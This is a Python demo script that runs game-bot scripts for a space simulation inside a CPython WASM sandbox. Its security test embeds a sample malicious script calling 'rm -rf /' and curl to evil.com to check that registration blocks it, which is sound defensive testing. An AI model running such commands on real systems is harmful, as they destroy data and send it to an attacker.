#!/usr/bin/env python3
"""
Standalone demo for spacecode WASM deployer integration.

This demonstrates how the WASM deployer can be used to execute
bot scripts safely in the spacecode environment.
"""

import sys
import json
from pathlib import Path
from typing import Dict, Any, Set
import math

# Add lib to path
sys.path.insert(0, str(Path(__file__).parent / 'lib'))

from lib.sim import Game, SimConfig, Ship, Action
from lib.cpython_wasm_deployer import CPythonWasmDeployer, execute_python_in_wasm


def create_sample_bot_script() -> str:
    """Create a sample bot script that can be executed in WASM"""
    return """
import json
import math

def bot_main(input_data):
    '''
    Sample spacecode bot that processes game state and returns actions.
    
    input_data contains:
    - game_state: current visible game state
    - ship_id: this bot's ship identifier
    - time_step: current simulation time step
    '''
    
    game_state = input_data.get('game_state', {})
    ship_id = input_data.get('ship_id', 0)
    time_step = input_data.get('time_step', 0)
    
    # Simple bot logic: move forward and turn occasionally
    actions = []
    
    # Always thrust forward
    actions.append('FORWARD')
    
    # Turn based on time step
    if time_step % 100 < 50:
        actions.append('LEFT')
    else:
        actions.append('RIGHT')
    
    # Shoot occasionally
    if time_step % 30 == 0:
        actions.append('SHOOT')
    
    return {
        'actions': actions,
        'debug_info': {
            'bot_name': 'SimpleBot',
            'actions_taken': len(actions),
            'time_step': time_step
        }
    }

# Entry point for WASM execution
def main():
    # In a real WASM environment, this would receive JSON input
    # For demo purposes, we simulate the input
    return bot_main({
        'game_state': {'visible_objects': []},
        'ship_id': 1,
        'time_step': 42
    })

if __name__ == "__main__":
    result = main()
    print(json.dumps(result))
"""


class WasmBotRunner:
    """Runs bot scripts in WASM environment and integrates with spacecode game"""
    
    def __init__(self):
        self.deployer = CPythonWasmDeployer(
            timeout_ms=3000,  # 3 second timeout for bot decisions
            memory_limit_pages=50,  # More memory for bot calculations
        )
        self.bots = {}  # bot_id -> script mapping
    
    def register_bot(self, bot_id: str, script: str) -> bool:
        """
        Register a bot script for execution.
        
        Args:
            bot_id: Unique identifier for the bot
            script: Python script source code
            
        Returns:
            True if registration successful, False otherwise
        """
        try:
            # Validate script by preparing it
            self.deployer.prepare_module(script)
            self.bots[bot_id] = script
            print(f"✅ Bot '{bot_id}' registered successfully")
            return True
        except Exception as e:
            print(f"❌ Failed to register bot '{bot_id}': {e}")
            return False
    
    def execute_bot(
        self, 
        bot_id: str, 
        game_state: Dict[str, Any], 
        ship_id: int, 
        time_step: int
    ) -> Set[Action]:
        """
        Execute a bot and return its chosen actions.
        
        Args:
            bot_id: Bot identifier
            game_state: Current visible game state
            ship_id: Bot's ship ID
            time_step: Current simulation step
            
        Returns:
            Set of actions chosen by the bot
        """
        if bot_id not in self.bots:
            print(f"❌ Bot '{bot_id}' not found")
            return set()
        
        # Prepare input data
        input_data = {
            'game_state': game_state,
            'ship_id': ship_id,
            'time_step': time_step
        }
        
        # Execute bot script
        result = self.deployer.execute_python_script(
            self.bots[bot_id], 
            input_data
        )
        
        if result.status.value != 'success':
            print(f"❌ Bot '{bot_id}' execution failed: {result.error}")
            return set()
        
        # Extract actions from result
        try:
            output = result.output
            if output and 'actions' in output:
                actions = set()
                for action_str in output['actions']:
                    try:
                        actions.add(Action[action_str])
                    except KeyError:
                        print(f"⚠️  Unknown action '{action_str}' from bot '{bot_id}'")
                
                print(f"🤖 Bot '{bot_id}' chose actions: {[a.name for a in actions]} "
                      f"(execution time: {result.execution_time_ms:.1f}ms)")
                return actions
            else:
                print(f"⚠️  Bot '{bot_id}' returned invalid output format")
                return set()
                
        except Exception as e:
            print(f"❌ Failed to parse bot '{bot_id}' output: {e}")
            return set()


def run_spacecode_demo():
    """Run a demonstration of spacecode with WASM bot integration"""
    print("=" * 60)
    print("Spacecode WASM Bot Integration Demo")
    print("=" * 60)
    
    # Create game instance
    cfg = SimConfig(
        gravity_const=1e-6,
        ship_thrust_force=0.001,
        ship_torque=0.5,
        ship_vision_reach=0.3
    )
    game = Game(cfg)
    
    # Create bot runner
    bot_runner = WasmBotRunner()
    
    # Create sample bot script
    sample_script = create_sample_bot_script()
    
    # Register the sample bot
    bot_runner.register_bot('sample_bot_1', sample_script)
    
    # Create a ship for the bot
    bot_ship = Ship(
        pos=0.3 + 0.3j,
        old_pos=0.3 + 0.3j,
        rot=1 + 0j,
        old_rot=1 + 0j,
        mass=0.02,
        inertia=0.1,
        radius=0.02
    )
    game.bodies.append(bot_ship)
    
    print(f"\n🚀 Starting simulation with {len(game.bodies)} entities")
    
    # Run simulation steps
    dt = 0.016  # ~60 FPS
    for step in range(10):
        print(f"\n--- Step {step + 1} ---")
        
        # Generate game state for bot (simplified)
        game_state = {
            'ship_position': [bot_ship.pos.real, bot_ship.pos.imag],
            'ship_rotation': [bot_ship.rot.real, bot_ship.rot.imag],
            'visible_objects': []  # Simplified - would contain other ships/objects
        }
        
        # Execute bot to get actions
        bot_actions = bot_runner.execute_bot(
            'sample_bot_1', 
            game_state, 
            ship_id=0, 
            time_step=step
        )
        
        # Apply actions to game
        actions_dict = {bot_ship: bot_actions}
        game.step(actions_dict, dt)
        
        # Show ship state
        print(f"Ship position: ({bot_ship.pos.real:.3f}, {bot_ship.pos.imag:.3f})")
        print(f"Ship rotation: {math.degrees(math.atan2(bot_ship.rot.imag, bot_ship.rot.real)):.1f}°")
    
    print(f"\n✅ Demo completed successfully!")


def test_security_sandbox():
    """Test the security sandboxing features"""
    print("\n" + "=" * 60)
    print("Security Sandbox Test")
    print("=" * 60)
    
    bot_runner = WasmBotRunner()
    
    # Test malicious script
    malicious_script = """
import os
import subprocess

def main():
    # Attempt to execute system commands
    os.system("rm -rf /")
    subprocess.run(["curl", "http://evil.com/steal-data"])
    return {"hacked": True}
"""
    
    print("\n🔒 Testing malicious script registration...")
    success = bot_runner.register_bot('malicious_bot', malicious_script)
    
    if not success:
        print("✅ Malicious script was correctly blocked!")
    else:
        print("❌ Security failure - malicious script was allowed!")
    
    # Test script with dangerous eval
    dangerous_script = """
def main():
    # Try to use eval to execute arbitrary code
    code = "print('This should not work')"
    eval(code)
    return {"result": "evaluated"}
"""
    
    print("\n🔒 Testing dangerous eval script...")
    success = bot_runner.register_bot('eval_bot', dangerous_script)
    
    if not success:
        print("✅ Dangerous eval script was correctly blocked!")
    else:
        print("❌ Security failure - dangerous eval was allowed!")


def main():
    """Main entry point"""
    print("Spacecode WASM Deployer - Standalone Demo")
    
    try:
        run_spacecode_demo()
        test_security_sandbox()
        
        print("\n" + "=" * 60)
        print("🎉 All demos completed successfully!")
        print("=" * 60)
        
    except KeyboardInterrupt:
        print("\n👋 Demo interrupted by user")
    except Exception as e:
        print(f"\n❌ Demo failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()